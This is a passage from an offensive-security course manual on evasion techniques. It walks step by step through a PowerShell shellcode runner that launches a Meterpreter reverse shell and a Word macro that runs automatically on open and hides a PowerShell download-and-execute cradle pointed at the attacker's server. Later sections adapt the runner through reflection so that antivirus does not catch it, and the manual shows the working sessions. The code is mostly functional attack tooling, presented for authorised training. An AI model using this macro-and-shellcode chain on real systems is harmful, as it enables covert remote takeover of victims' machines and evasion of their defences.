PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
68 
public class User32 { 
    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
    public static extern int MessageBox(IntPtr hWnd, String text,  
        String caption, int options); 
} 
Listing 53 - C# DllImport statement for MessageBox 
The name of the class (User32 in our case) is arbitrary and any could be chosen. 
Now that we have a C# import and a P/Invoke translation, we need to invoke it from PowerShell 
with the Add-Type124 keyword. Specifying Add-Type in PowerShell will force the .NET framework 
to compile and create an object containing the structures, values, functions, or code inside the 
Add-Type statement. 
Put simply, Add-Type uses the .NET framework to compile the C# code containing Win32 API 
declarations. 
The complete Add-Type statement is shown in Listing 54. 
$User32 = @" 
using System; 
using System.Runtime.InteropServices; 
 
public class User32 { 
    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
    public static extern int MessageBox(IntPtr hWnd, String text,  
        String caption, int options); 
} 
"@ 
 
Add-Type $User32 
Listing 54 - PowerShell Add-Type statement for importing MessageBox 
First, note that PowerShell uses either a newline or a semicolon to signify the end of a statement. 
The “@” keyword declares Here-Strings125 which are a simple way for us to declare blocks of text. 
In summary, the code first creates a $User32 variable and sets it to a block of text. Inside that 
block of text, we set the program to use System and System.Runtime.InteropServices. Then we 
import the MessageBox API from the user32 dll, and finally we use Add-Type to compile the C# 
code contained in the $User32 variable. 
Our code is nearly complete. We now simply need to execute the API itself. This can be done 
through the instantiated User32 .NET object as shown below. Here we are telling the program to 
call MessageBox and present a dialog prompt that says “This is an alert”: 
[User32]::MessageBox(0, "This is an alert", "MyBox", 0) 
 
124 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-
5.1 
125 (Microsoft, 2015), https://devblogs.microsoft.com/scripting/powertip-use-here-strings-with-powershell/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
69 
Listing 55 - Calling the Win32 API MessageBox from PowerShell 
At this point, our code looks like this: 
$User32 = @" 
using System; 
using System.Runtime.InteropServices; 
 
public class User32 { 
    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
    public static extern int MessageBox(IntPtr hWnd, String text,  
        String caption, int options); 
} 
"@ 
 
Add-Type $User32 
 
[User32]::MessageBox(0, "This is an alert", "MyBox", 0) 
Listing 56 - Full code calling Win32 API MessageBox from PowerShell 
This code should invoke MessageBox from PowerShell. Remember that our Microsoft Office 2016 
version of Word is a 32-bit process, which means that PowerShell will also launch as a 32-bit 
process. In order to properly simulate and test this scenario, we should use the 32-bit version of 
PowerShell ISE located at: 
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe 
Listing 57 - Path to the 32-bit version of PowerShell ISE 
When the code is executed, we obtain a message box as shown in Figure 23. 
 
Figure 23: Calling MessageBox from PowerShell 
This works quite well and demonstrates that while PowerShell cannot natively use Win32 APIs, 
Add-Type can invoke them through P/Invoke. In the next section, we will use a similar technique 
to implement our VBA shellcode runner in PowerShell. 
3.5.1.1 Exercises 
1. 
Import and call MessageBox using Add-Type as shown in this section. 
2. 
Apply the same techniques to call the Win32 GetUserName API. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
70 
3.5.2 Porting Shellcode Runner to PowerShell 
The concept of translating our shellcode runner technique from VBA to PowerShell is not that 
complicated. We can do this by reusing the theory from our VBA shellcode runner. We already 
know the three steps to perform. First, we allocate executable memory with VirtualAlloc. Next, we 
copy our shellcode to the newly allocated memory region. Finally, we execute it with 
CreateThread. 
In the VBA code, we used RtlMoveMemory to copy the shellcode, but in PowerShell we can use 
the .NET Copy126 method from the System.Runtime.InteropServices.Marshal namespace. This 
allows data to be copied from a managed array to an unmanaged memory pointer. 
We’ll use P/Invoke (from a www.pinvoke.net search) to translate the arguments of VirtualAlloc and 
CreateThread, creating the following Add-Type statement. 
$Kernel32 = @" 
using System; 
using System.Runtime.InteropServices; 
 
public class Kernel32 { 
    [DllImport("kernel32")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect); 
    [DllImport("kernel32", CharSet=CharSet.Ansi)] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint 
dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId); 
} 
"@ 
 
Add-Type $Kernel32 
Listing 58 - Using P/Invoke and Add-Type to import VirtualAlloc and CreateThread 
Note that we used Here-Strings to assign a block of text to the $Kernel32 variable. We also 
created the import statements in the public Kernel32 class so we can reference it and compile it 
later. 
Next we must supply the required shellcode, which we’ll again generate with msfvenom. This time, 
we’ll use the ps1 output format: 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 
LPORT=443 EXITFUNC=thread -f ps1 
... 
Payload size: 480 bytes 
Final size of ps1 file: 2356 bytes 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89... 
Listing 59 - Creating shellcode in ps1 format 
Now that the shellcode has been generated, we can copy the $buf variable and add it to our code. 
We’ll also start setting the API arguments as shown in Listing 60. 
 
126 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
71 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60... 
 
$size = $buf.Length 
 
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40); 
 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size) 
 
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0); 
Listing 60 - Shellcode runner in PowerShell 
We invoked the imported VirtualAlloc call with the same arguments as before. These include a “0” 
to let the API choose the allocation address, the detected size of the shellcode, and the 
hexadecimal numbers 0x3000 and 0x40 to set up memory allocation and protections correctly. 
We used the .NET Copy method to copy the shellcode, supplying the managed shellcode array, an 
offset of 0 indicating the start of the buffer, the unmanaged buffer address, and the shellcode 
size. 
Finally, we called CreateThread, supplying the starting address. 
If we run this code from PowerShell ISE, we get a reverse shell. Nice. 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x86 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 61 - Multi/handler catches Meterpreter shellcode executed by PowerShell 
Now we need to trigger this from a Word macro. However, we won’t simply embed the 
PowerShell code in VBA. Instead, we’ll create a cradle that will download our code into memory 
and execute it. 
The code for the download cradle is shown below: 
Sub MyMacro() 
    Dim str As String 
    str = "powershell (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX" 
    Shell str, vbHide 
End Sub 
 
Sub Document_Open() 
    MyMacro 
End Sub 
 
Sub AutoOpen() 
    MyMacro 
End Sub 
Listing 62 - VBA code calling the PowerShell cradle that executes the shellcode runner 
First, we declared a string variable containing the PowerShell invocation of the download cradle 
through the Net.WebClient class. Once the PowerShell script has been downloaded into memory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
72 
as a string, it then executes using Invoke-Expression (IEX). This entire code execution is triggered 
with the Shell command. 
Notice that the download cradle references the run.ps1 in the web root of our Kali machine. To 
execute our code, we first copy our PowerShell shellcode runner into the run.ps1 file on our Kali 
Apache web server. 
Next we open Microsoft Word and insert the VBA code in Listing 62 into our macro and execute it. 
However, we don’t catch a shell in our multi/handler. Let’s try to troubleshoot. 
First, we know the macro is executing because our Kali machine’s Apache logs reveal the GET 
request for the shellcode runner as shown in Listing 63. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.11 - - [08/Jun/2020:05:21:22 -0400] "GET /run.ps1 HTTP/1.1" 200 4202 "-" 
"-" 
Listing 63 - Apache access log showing our run.ps1 script being fetched 
On the Windows side, if we use Process Explorer, and we are quick, we might notice that a 
PowerShell process is being created but then quickly terminates. 
The reason for this is fairly straightforward. Our previous VBA shellcode runner continued 
executing because we never terminated its parent process (Word). However, in this version, our 
shell dies as soon as the parent PowerShell process terminates. Our shell is essentially being 
terminated before it even starts. 
To solve this, we must instruct PowerShell to delay termination until our shell fully executes. We’ll 
use the Win32 WaitSingleObject127 API to pause the script and allow Meterpreter to finish. 
We’ll update our shellcode runner PowerShell script to import WaitForSingleObject using P/Invoke 
and Add-Type and invoke it as shown in the highlighted sections of Listing 64: 
$Kernel32 = @" 
using System; 
using System.Runtime.InteropServices; 
 
public class Kernel32 { 
    [DllImport("kernel32")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,  
        uint flAllocationType, uint flProtect); 
         
    [DllImport("kernel32", CharSet=CharSet.Ansi)] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,  
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,  
            uint dwCreationFlags, IntPtr lpThreadId); 
             
    [DllImport("kernel32.dll", SetLastError=true)] 
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,  
        UInt32 dwMilliseconds); 
 
127 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
73 
} 
"@ 
 
Add-Type $Kernel32 
... 
 
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF") 
Listing 64 - Importing WaitSingleObject and calling it to stop PowerShell from terminating 
Let’s discuss this addition. When CreateThread is called, it returns a handle to the newly created 
thread. We provided this handle to WaitForSingleObject along with the time to wait for that thread 
to finish. In this case, we have specified 0xFFFFFFFF, which will instruct the program to wait 
forever or until we exit our shell. Notice that we have explicitly performed a type cast on this value 
to an unsigned integer with the [uint32] static .NET type because PowerShell only uses signed 
integers. 
We again used Here-Strings to assign a block of text to the $Kernel32 variable. Inside our class, 
we imported three Windows APIs. We then used Add-Type to compile the public Kernel32 class 
that we invoked when using the APIs. This addition should halt the premature termination of 
PowerShell. 
We can now update the PowerShell shellcode runner hosted on our Kali Linux web server and 
rerun the VBA code. This should result in a reverse Meterpreter shell. Very Nice. 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 65 - Meterpreter reverse shell from PowerShell inside a VBA macro is not exiting 
We can also observe the PowerShell process running as a child process of Word (Figure 24). 
 
Figure 24: PowerShell as a child process running Meterpreter shellcode 
In this section we created a shellcode runner in PowerShell. We used the VBA code in our Word 
macro to download and execute this script from our Kali web server. This effectively moved our 
payload from the Word document and it would appear that the code is running completely in 
memory, which should help evade detection. 
3.5.2.1 Exercises 
1. 
Replicate the PowerShell shellcode runner used in the section. 
2. 
Is it possible to use a different file extension like .txt for the run.ps1 file? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
74 
3.6 Keep That PowerShell in Memory 
Since our VBA and PowerShell shellcode runners do not write to disk, it seems safe to assume 
that they are fully executing from memory. However, PowerShell and the .NET framework leave 
artifacts on the hard drive that antivirus programs can identify. 
In this section, we will investigate these artifacts and use the .NET framework reflection128 
technique to avoid creating them. But first, let’s discuss how exactly these artifacts are created. 
3.6.1 Add-Type Compilation 
As we discussed previously, the Add-Type keyword lets us use the .NET framework to compile C# 
code containing Win32 API declarations and then call them. This compilation process is 
performed by the Visual C# Command-Line Compiler or csc.129 During this process, both the C# 
source code and the compiled C# assembly are temporarily written to disk. 
Let’s demonstrate this with our prior PowerShell MessageBox example. We’ll use Process 
Monitor130 from SysInternals to monitor file writes. 
Note that Process Monitor and Process Explorer are two different tools from the 
SysInternals Suite. 
To start monitoring file writes, we must first open Process Monitor and navigate to Filter > Filter. 
In the new dialog window, we can create filter rules. Figure 25 shows a filter for file writes by the 
powershell_ise.exe process. 
 
Figure 25: Process Monitor filter creation 
 
128 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection 
129 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-
with-csc-exe 
130 (Microsoft, 2017), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
75 
 
We’ll Add and Apply the filter and clear any old events by pressing C+x. 
Next, we’ll open the 32-bit version of PowerShell ISE and run the code to launch the MessageBox, 
which is shown in Listing 66. 
$User32 = @" 
using System; 
using System.Runtime.InteropServices; 
 
public class User32 { 
    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int 
options); 
} 
"@ 
 
Add-Type $User32 
 
[User32]::MessageBox(0, "This is an alert", "MyBox", 0) 
Listing 66 - MessageBox PowerShell code using Add-Type 
Let’s review the results. After executing the PowerShell code, Process Monitor lists many events 
including CreateFile, WriteFile, and CloseFile operations as shown in Figure 26. 
 
Figure 26: Process Monitor output showing file operations 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
76 
 
These API calls are used for file operations and the file names used in the operations, including 
rtylilrr.0.cs and rtylilrr.dll, are especially interesting. While the filename itself is randomly 
generated, the file extensions suggest that both the C# source code and the compiled code have 
been written to the hard drive. 
If our suspicion is correct, then the rtylilrr.dll assembly should be loaded into the PowerShell ISE 
process. 
We can list loaded assemblies using the GetAssemblies131 method on the CurrentDomain132 
object. This method is invoked through the static AppDomain133 class (using the  format) as 
shown in Listing 67. 
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> 
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-
Table fullname 
 
FullName                                                                                            
--------                                                                                            
0bhoygtr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                     
Accessibility, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                    
Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, 
PublicKeyToken=null                
MetadataViewProxies_092d3241-fb3c-4624-9291-72685e354ea4, Version=0.0.0.0, 
Culture=neutral, PublicKeyToken=null  
Microsoft.GeneratedCode, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null                      
...    
PresentationFramework-SystemXml, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b77a5c561934e089               
qdrje0cy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                     
r1b1e3au, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                     
rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null 
... 
Listing 67 - Assemblies loaded in the PowerShell ISE process 
We improved the readability of the output by piping it into the Sort-Object134 cmdlet, which 
sorted it by name as supplied with the -Property option. Finally, we piped the result of the sort 
into the Format-Table cmdlet to list the output as a table. 
As shown in the list of loaded assemblies, the rtylilrr file is indeed loaded into the process. 
Our investigation reveals that PowerShell writes a C# source code file (.cs) to the hard drive, 
which is compiled into an assembly (.dll) and then loaded into the process. 
The Add-Type code will likely be flagged by endpoint antivirus, which will halt our attack. We’ll 
need to rebuild our PowerShell shellcode runner to avoid this. 
 
131 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.getassemblies?view=netframework-4.8 
132 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.currentdomain?view=netframework-4.8 
133 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.appdomain?view=netframework-4.8 
134 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/sort-object?view=powershell-
6 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
77 
3.6.1.1 Exercises 
1. 
Execute the Add-Type MessageBox PowerShell code and capture the source code and 
assembly being written to disk. 
2. 
Does the current PowerShell shellcode runner write files to disk? 
3.6.2 Leveraging UnsafeNativeMethods 
Let’s try to improve our shellcode runner. It executed three primary steps related to the Win32 
APIs. It located the function, specified argument data types, and invoked the function. Let’s first 
focus on the techniques we used to locate the functions. 
There are two primary ways to locate functions in unmanaged dynamic link libraries. Our original 
technique relied on the Add-Type and DllImport keywords (or the Declare keyword in VBA). 
However, Add-Type calls the csc compiler, which writes to disk. We must avoid this if we want to 
operate completely in-memory. 
Alternatively, we can use a technique known as dynamic lookup, which is commonly used by low-
level languages like C. By taking this path, we hope to create the .NET assembly in memory 
instead of writing code and compiling it. This will take significantly more work, but it is a valuable 
technique to understand. 
To perform a dynamic lookup of function addresses, the operating system provides two special 
Win32 APIs called GetModuleHandle135 and GetProcAddress.136 
GetModuleHandle obtains a handle to the specified DLL, which is actually the memory address of 
the DLL. To find the address of a specific function, we’ll pass the DLL handle and the function 
name to GetProcAddress, which will return the function address. We can use these functions to 
locate any API, but we must invoke them without using Add-Type. 
Since we cannot create any new assemblies, we’ll try to locate existing assemblies that we can 
reuse. We’ll use the code in Listing 68 to find assemblies that match our criteria. 
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies() 
 
$Assemblies | 
  ForEach-Object { 
    $_.GetTypes()| 
      ForEach-Object { 
          $_ | Get-Member -Static| Where-Object { 
            $_.TypeName.Contains('Unsafe') 
          } 
      } 2> $null 
    } 
Listing 68 - Code to list and parse functions in loaded assemblies 
To begin, we are relying on GetAssemblies to search preloaded assemblies in the PowerShell 
process. Since each assembly is an object, we will use the ForEach-Object137 cmdlet to loop 
 
135 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea 
136 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
78 
through them. We’ll then invoke GetTypes138 for each object through the $_139 variable (which 
contains the current object) to obtain its methods and structures. 
It stands to reason that we could search the preloaded assemblies for the presence of 
GetModuleHandle and GetProcAddress, but we can also narrow the search more specifically. For 
example, when C# code wants to directly invoke Win32 APIs it must provide the Unsafe140 
keyword. Furthermore, if any functions are to be used, they must be declared as static to avoid 
instantiation. 
Knowing this, we’ll perform yet another ForEach-Object loop on all the discovered objects and 
invoke the Get-Member141 cmdlet with the -Static flag to only locate static properties or methods. 
The ForEach-Object loop is an advanced version of the regular For loop and like 
other loops, it can be nested, although this may lead to performance issues. 
Finally, we pipe these static properties and methods through the Where-Object142 cmdlet and filter 
any TypeName143 (which contains meta information about the object) that contains the keyword 
Unsafe. 
This should dump every function that satisfies our criteria. Let’s run it and examine the output, 
shown in Listing 69. 
... 
 TypeName: Microsoft.Win32.UnsafeNativeMethods 
 
Name                             MemberType Definition                                              
----                             ---------- ----------                                              
....                                 
GetModuleFileName                Method     static int 
GetModuleFileName(System.Runtime.InteropServices.HandleRef hModule, 
System.Text.StringBuilder buf... 
GetModuleHandle                  Method     static System.IntPtr 
GetModuleHandle(string modName)                                                            
GetNumberOfEventLogRecords       Method     static bool 
GetNumberOfEventLogRecords(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] 
int count)    
GetOldestEventLogRecord          Method     static bool 
 
137 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/foreach-
object?view=powershell-6 
138 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=netframework-4.8 
139 (Microsoft, 2019), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.core/about/about_automatic_variables?view=powershell-6 
140 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/unsafe 
141 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-
member?view=powershell-6 
142 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-
object?view=powershell-6 
143 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/microsoft.visualbasic.information.typename?view=netframework-
4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
79 
GetOldestEventLogRecord(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] int 
number)      
GetProcAddress                   Method     static System.IntPtr 
GetProcAddress(System.IntPtr hModule, string methodName), static System.IntPtr 
GetProcA... 
GetProcessWindowStation          Method     static System.IntPtr  
... 
Listing 69 - Output from parsing loaded assemblies 
This code generates an enormous amount of output. If we search the output for 
“GetModuleHandle”, we locate sixteen occurrences. One of them is located in the 
Microsoft.Win32.UnsafeNativeMethods class as shown in the truncated output above. 
We also notice that the same class contains GetProcAddress, our other required function. Let’s try 
to identify which assembly contains these two functions. 
To do this, we’ll modify the parsing code to first print the current assembly location through the 
Location144 property and then inside the nested ForEach-Object loop make the TypeName match 
Microsoft.Win32.UnsafeNativeMethods instead of listing all methods with the static keyword. 
The modified script is shown in Listing 70. 
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies() 
 
$Assemblies | 
  ForEach-Object { 
    $_.Location 
    $_.GetTypes()| 
      ForEach-Object { 
          $_ | Get-Member -Static| Where-Object { 
            $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods') 
          } 
      } 2> $null 
    } 
Listing 70 - Locating the assembly in which GetModuleHandle and GetProcAddress are located 
The truncated output in Listing 71 shows that the assembly is System.dll. This is reasonable since 
it’s a common system library that contains fundamental content such as common data types and 
references. 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.dll 
 
 
   TypeName: Microsoft.Win32.UnsafeNativeMethods 
 
Name                             MemberType Definition                                              
----                             ---------- ----------                                              
Equals                           Method     static bool Equals(System.Object objA, 
System.Object objB)       
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object 
objA, System.Object... 
C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe 
 
144 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.location?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
80 
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.ISECommon\v4.0_3.0.0.0
__31bf3856ad364e35\Micr 
osoft.PowerShell.ISECommon.dll 
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\Syste
m.dll 
ClearEventLog                    Method     static bool 
ClearEventLog(System.Runtime.InteropServices.Safe... 
CreateWindowEx                   Method     static System.IntPtr CreateWindowEx(int 
exStyle, string lpszC... 
DefWindowProc                    Method     static System.IntPtr 
DefWindowProc(System.IntPtr hWnd, int ms... 
DestroyWindow                    Method     static bool 
DestroyWindow(System.Runtime.InteropServices.Hand... 
DispatchMessage                  Method     static int DispatchMessage([ref] 
Microsoft.Win32.NativeMethod... 
Equals                           Method     static bool Equals(System.Object objA, 
System.Object objB)       
GetClassInfo                     Method     static bool 
GetClassInfo(System.Runtime.InteropServices.Handl... 
GetDC                            Method     static System.IntPtr GetDC(System.IntPtr 
hWnd)                   
GetFileVersionInfo               Method     static bool GetFileVersionInfo(string 
lptstrFilename, int dwH... 
GetFileVersionInfoSize           Method     static int GetFileVersionInfoSize(string 
lptstrFilename, [ref... 
GetModuleFileName                Method     static int 
GetModuleFileName(System.Runtime.InteropServices.H... 
GetModuleHandle                  Method     static System.IntPtr 
GetModuleHandle(string modName)             
GetNumberOfEventLogRecords       Method     static bool 
GetNumberOfEventLogRecords(System.Runtime.Interop... 
GetOldestEventLogRecord          Method     static bool 
GetOldestEventLogRecord(System.Runtime.InteropSer... 
GetProcAddress                   Method     static System.IntPtr 
GetProcAddress(System.IntPtr hModule, st... 
... 
Listing 71 - Locating the assembly in which GetModuleHandle and GetProcAddress are located 
However, there is an issue that these methods are only meant to be used internally by the .NET 
code. This blocks us from calling them directly from PowerShell or C#. 
To solve this issue, we have to develop a way that allows us to call it indirectly. This requires us to 
use multiple techniques that will lead us down a deep rabbit hole. 
The first step is to obtain a reference to these functions. To do that, we must first obtain a 
reference to the System.dll assembly using the GetType145 method. 
This reference to the System.dll assembly will allow us to subsequently locate the 
GetModuleHandle and GetProcAddress methods inside it. 
Like the previous filtering we have performed, it is not straightforward.146 Here’s the code we will 
use: 
 
145 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.object.gettype?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
81 
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {  
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }) 
   
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods') 
Listing 72 - Obtaining a reference to the System.dll assembly 
First, we’ll pipe all the assemblies into Where-Object and filter on two conditions. The first is 
whether the GlobalAssemblyCache147 property is set. The Global Assembly Cache is essentially a 
list of all native and registered assemblies on Windows,148 which will allow us to filter out non-
native assemblies. 
The second filter is whether the last part of its file path is “System.dll” as obtained through the 
Location property. Recall we found the full path to be the following: 
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\Syste
m.dll 
Listing 73 - The full path to the System.dll assembly 
We’ll use the Split149 method to split it into an array based on the directory delimiter (\). 
Finally, we select the last element of the split string array with the “-1” index and check if it is equal 
to “System.dll”. 
Using GetType to obtain a reference to the System.dll assembly at runtime is an example of the 
Reflection150 technique. This is a very powerful feature that allows us to dynamically obtain 
references to objects that are otherwise private or internal. 
We’ll use this technique once again with the GetMethod151 function to obtain a reference to the 
internal GetModuleHandle method: 
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {  
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }) 
   
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods') 
 
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle') 
Listing 74 - Obtaining a reference to GetModuleHandle through reflection 
Executing the combined code returns the method object inside the System.dll assembly, in spite 
of it being an internal only method. 
We can now use the internal Invoke152 method to call GetModuleHandle and obtain the base 
address of an unmanaged DLL. 
 
146 (Exploit Monday, 2012), http://www.exploit-monday.com/2012_05_13_archive.html 
147 (Microsoft, 2019), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.assembly.globalassemblycache?view=netframework-4.8 
148 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac 
149 (Microsoft, 2014), https://devblogs.microsoft.com/scripting/using-the-split-method-in-powershell/ 
150 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection 
151 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.typeinfo.getmethod?view=netstandard-1.6 
152 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.methodbase.invoke?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
82 
As shown in Listing 75, Invoke takes two arguments and both are objects. The first argument is 
the object to invoke it on but since we use it on a static method we may set it to “$null”. The 
second argument is an array consisting of the arguments for the method we are invoking 
(GetModuleHandle). Since the Win32 API only takes the name of the DLL as a string we only need 
to supply that. 
To repeat earlier examples, we are going to resolve user32.dll, so that we can again call 
MessageBox. 
$GetModuleHandle.Invoke($null, @("user32.dll")) 
Listing 75 - Calling GetModuleHandle through reflection 
Execution of the last statement and its associated output is shown in Listing 76: 
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> $GetModuleHandle.Invoke($null, 
@("user32.dll")) 
1973485568 
Listing 76 - Invoking GetModuleHandle on user32.dll and obtaining its base address 
To verify that the lookup worked, we translate the value 1973485568 to its hexadecimal 
equivalent of 0x75A10000 and open Process Explorer. 
In Process Explorer, we’ll select the PowerShell ISE process. Navigate to View > Lower Pane View 
> DLLs, in the new sub window locate user32.dll, and double click it. In the properties window, we 
can compare the resolved value to the Load Address shown in Figure 27. 
 
Figure 27: Loaded address of user32.dll obtained from Process Explorer 
